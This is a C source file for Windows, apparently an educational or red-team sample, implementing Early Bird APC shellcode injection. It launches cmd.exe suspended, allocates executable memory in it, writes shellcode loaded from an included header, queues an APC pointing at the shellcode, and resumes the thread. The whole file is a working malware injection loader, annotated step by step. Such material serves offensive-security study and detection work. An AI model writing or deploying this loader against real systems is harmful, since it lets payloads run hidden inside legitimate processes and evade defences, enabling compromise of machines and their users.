#include <windows.h>
#include <stdio.h>


int main() {

    #include "../shellcode.h"

    STARTUPINFOW si = { 0 };            // Structure to specify window properties for the new process
    si.cb = sizeof(si);                 // Set the size of the structure
    si.dwFlags = STARTF_USESHOWWINDOW;  // Indicate that we want to set the window show state

    PROCESS_INFORMATION pi = { 0 };     // Structure to receive information about the new process

    // Create the new process in a suspended state
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
    BOOL CreateProcessW(
        [in, optional]      LPCWSTR               lpApplicationName,
        [in, out, optional] LPWSTR                lpCommandLine,
        [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        [in]                BOOL                  bInheritHandles,
        [in]                DWORD                 dwCreationFlags,
        [in, optional]      LPVOID                lpEnvironment,
        [in, optional]      LPCWSTR               lpCurrentDirectory,
        [in]                LPSTARTUPINFOW        lpStartupInfo,
        [out]               LPPROCESS_INFORMATION lpProcessInformation
    );
    */
    BOOL success = CreateProcessW( //It's CreateProcessW because we are using the wide-character version of the STARTUPINFO structure
        L"C:\\Windows\\System32\\cmd.exe",  // Application name
        NULL,                               // Command line
        NULL,                               // Process attributes
        NULL,                               // Thread attributes
        FALSE,                              // Do not inherit handles
        CREATE_SUSPENDED,                   // Creation flags - create the process in a suspended state
        NULL,                               // Use the parent's environment
        L"C:\\Windows\\System32",           // Current directory
        &si,                                // Pointer to STARTUPINFO structure
        &pi                                 // Pointer to PROCESS_INFORMATION structure
    );

    // Check if the process creation was successful
    if (!success) {
        printf("CreateProcess failed. Error: %lu\n", GetLastError());
        return -1;
    }
    printf("Process created successfully with PID: %lu\n", pi.dwProcessId);

    // Allocate memory for the shellcode
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,
        [in]           SIZE_T dwSize,
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect
    );
    */
    LPVOID HandleMemory = VirtualAllocEx(
        pi.hProcess,                // Handle to the target process
        NULL,                       // No specific address because we don't mind where it is allocated 
        sizeof(shellcode),          // Size of the allocation we need (size of our shellcode)
        MEM_COMMIT | MEM_RESERVE,   // Allocate reserved and committed memory
        PAGE_EXECUTE_READWRITE      // Memory protection - we need to be able write the shellcode and execute it in this memory
    );
    
    // Check if the memory allocation was successful
    if (HandleMemory == NULL) {
        return -1;
    }
    printf("Memory allocated successfully at address: %p\n", HandleMemory);

    // Write the shellcode to the allocated memory
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten
    );
    */
    SIZE_T bytesWritten = 0;
    BOOL RESULT = WriteProcessMemory(
        pi.hProcess,                // Handle to the target process 
        HandleMemory,               // Pointer to the base address in the target process where data will be written (our allocated memory)
        &shellcode,                 // Pointer to the buffer that contains the data to be written (our shellcode)
        sizeof(shellcode),          // Size of the data to be written (size of our shellcode)
        &bytesWritten               // Receives the number of bytes written
    );

    // Check if the WriteProcessMemory call was successful
    if (RESULT == 0 || bytesWritten != sizeof(shellcode)) {
        return -1;
    }
    printf("Wrote %zu bytes to allocated memory.\n", bytesWritten);

    // Queue the APC to the target thread
    /*
    https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueapcthread
    DWORD QueueUserAPC(
        [in] PAPCFUNC  pfnAPC,
        [in] HANDLE    hThread,
        [in] ULONG_PTR dwData
    );
    */
    DWORD apcResult = QueueUserAPC(
        (PAPCFUNC)HandleMemory, // Pointer to the APC function (our shellcode in the target process)
        pi.hThread,             // Handle to the target thread
        0                       // No data to be passed to the APC function
    );


    // Check if the QueueUserAPC call was successful
    if (apcResult == 0) {
        printf("QueueUserAPC failed. Error: %lu\n", GetLastError());
        return -1;
    }
    printf("APC queued successfully to thread ID %d.\n", pi.dwThreadId);

    ResumeThread(pi.hThread); // Resume the main thread of the target process to trigger the APC

    // Clean up handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}